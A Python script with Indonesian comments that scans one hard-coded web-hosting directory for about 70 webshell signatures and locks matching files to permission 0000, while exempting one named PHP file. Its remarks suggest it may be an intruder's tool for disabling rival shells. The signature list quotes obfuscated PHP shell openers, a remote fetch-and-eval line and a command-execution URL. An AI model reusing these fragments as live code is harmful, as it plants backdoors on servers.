import os
import concurrent.futures

def cari_keyword_dalam_file(path):
    try:
        # Mengecek apakah nama file adalah NGENTOTKONTO.php
        if os.path.basename(path) == "Suksesidb!@123.php":
            return None

        with open(path, 'r', errors='ignore') as file_baca:
            isi_file = file_baca.read()
            # Mencari keyword tanpa memperhatikan casing
            if keyword.lower() in isi_file.lower():
                return path
    except Exception as e:
        print(f"Gagal membaca file {path}: {e}")
    return None

def cari_keyword_dalam_direktori(direktori, keyword):
    hasil_pencarian = []

    # Mengecek setiap file dan direktori dalam direktori yang diberikan, termasuk subdirektori
    for root, dirs, files in os.walk(direktori):
        paths = [os.path.join(root, file) for file in files]
        
        # Membuat thread pool
        with concurrent.futures.ThreadPoolExecutor() as executor:
            # Menggunakan thread pool untuk mencari keyword dalam file
            results = executor.map(cari_keyword_dalam_file, paths)
            
            # Mengumpulkan hasil pencarian yang tidak None (artinya file ditemukan)
            hasil_pencarian.extend(filter(None, results))

    return hasil_pencarian

# Daftar keyword yang akan dicoba
daftar_keyword = [
    """echo ("<script>\nalert('Directory is Corrupted and Unreadable.');\nwindow.location.replace('?');\n</script>");"""
    """<?php ${"\x47\x4c\x4f\x42\x41L\x53"}["\x6ar\x6c\x78y\x75\x64"]=""",
    """<td>".cfn($euybray)." <a href=\"?lokasie=$lokasi/$mekicina&loknya=$lokasi\">$mekicina</a></td>""",
    """<?php ${"GLOBAL\x53"}["\x73\x79\x66d\x67o\x76"]="\x70e\x72ms";${"\x47\x4cOBA\x4cS"}["ntsrs\x63"]="i\x6e\x66\x6f";${""",
    """<?php ${"\x47\x4c\x4fBAL\x53"}["\x67\x74\x65uz\x78"]="\x78\x70\x6c\x31";${"\x47\x4c\x4f\x42AL\x53"}""",
    """$url = 'https://raw.githubusercontent.com/MadExploits/Gecko/main/gecko-new.php';""",
    """eval("?>" . FilE_get_cOntenTS('https://raw.githubusercontent.com/MadExploits/Gecko/main/gecko-new.php'));""",
    """<?php header("X-XSS-Protection: 0");ob_start();set_time_limit(0);error_reporting(0);ini_set('display_errors', FALSE);\n""",
    """<?php $sySvn = 'strre'.'v'; $SYpUb = 'b'.'ase64'.'_d'.'eco'.'de'; $vAgCR = 'gzinfl'.'ate'; ini_set('error_log', NULL);""",
    """<?php error_reporting(0);ini_set("display_errors", 0);if(!defined('rnavkdih')){define('rnavkdih',__FILE__);if(!function_exists(""",
    """<?php echo '<pre>'.php_uname()."\n".'<br/><form method="post" enctype="multipart/form-data"><input type="file" name="__"><input name="_" type="submit" value="Upload">""",
    """<h5 class="border p-1 mb-3">Edit file</h5>""",
    "htmlspecialchars_decode",
    "base64_decode",
    "By: MR.P4UL / Bo0G3yM4n",
    "<title>IndoXploit</title>",
    "solevisible@gmail.com",
    "https://github.com/eviltwin-id/eviltwin-shell",
    "Watching webshell!",
    "IndoSec sHell",
    "https://github.com/b374k/b374k",
    "c99shell.php",
    "Cylul007 Webshell Is Webshell",
    "Tiny File Manager V2.4.6",
    "22Xploiter Shell Backdoor",
    "Special thanks for Holiq@Indosec",
    "Beyaz_Hacker.php",
    "SimAttacker - Edited By KingDefacer",
    "https://github.com/Saskraxploit",
    "Saudi Sh3ll&lt",
    "RandsX aka T1kus_g0t",
    "Priv Shell",
    "Your shell script was succefully deleted!",
    "ANON GHOST TEAM - GHOST SQUAD HACKERS",
    "Anon7 - AnonsecTeam",
    "https://www.facebook.com/Hun73r.Ariyan",
    "http://pastebin.com/u/shutdown57",
    "http://www.fopo.com.ar/",
    "https://privdayz.com/wp-content/themes/privdaysv1/hacker.css",
    "Andela Web Shell",
    "https://Www.PHPJiaMi.Com/",
    "Berandal Shell",
    "Free Online PHP Obfuscator",
    "Responsive Webshell",
    "Tools Shell Diambil Dari Contek Shell & Indoxploit Shell",
    "Hacked By nginxDEX",
    "https://github.com/xchwarze/CCCPShell",
    "CR4ZY 3RR0R M!N! 5H311",
    "Protected By Mrcakil",
    "An Indian Hacker",
    "Emperor Hacking TEAM",
    "if(empty($cmd))",
    "http://www.rootkitninja.com/",
    "http://target.com/ecchi.php?a=system&ecchi[]=ls",
    "Summary of EcchiShell",
    "./EcchiExploit",
    "IndoXploit",
    "Blackhat Shell",
    "Exploit-Kita Webshell",
    "//header('Content-Type:text/html; charset=utf-8');",
    '$An0n_3xPloiTeR = "\x63N7',
    "Leaf PHP Mailer by [leafmailer.pw]"
    '$Cyto = "Sy1LzN',
    "eval($",
    "aDriv4 TooL priv",
    "geturlsinfo('https://shell.prinsh.com/Nathan/alfa.txt');",
    "<title>Tak Terlihat Shell</title>",
    "(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval",
    "$hKJFspjtwy= function ($xqMjFDQxlm) {",
    '''<a href="?upload&q=' . urlencode(encodePath(PATH)) . '"><button class="btn btn-dark" type="button">Upload File</button></a>''',
    "<title>{Ninja-Shell}</title>",
    "'base6'.'4'.'_'.'dec'.'ode'",
    """define("HTACCESS", "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .con7ext \n AddHandler cgi-script .con7ext \n AddHandler cgi-script .con7ext");"""
]

# Melakukan pencarian untuk setiap keyword
for keyword in daftar_keyword:
    hasil_pencarian = cari_keyword_dalam_direktori("/home3/djmeds/themedcollective.com/", keyword)

    # Menampilkan hasil pencarian
    if hasil_pencarian:
        print(f"Berhasil Menemukan B0ss'{keyword}' ")
        for path in hasil_pencarian:
            print(f"{path} > Ini Shell Orang Boss")
            
            # Mengatur hak akses file menjadi 0000
            try:
                os.chmod(path, 0o000)
                print(f"Hak akses file {path} berhasil diubah menjadi 0000.")
            except Exception as e:
                print(f"Gagal mengubah hak akses file {path}: {e}")
    else:
        print(f"Tidak ada file dengan keyword '{keyword}'")
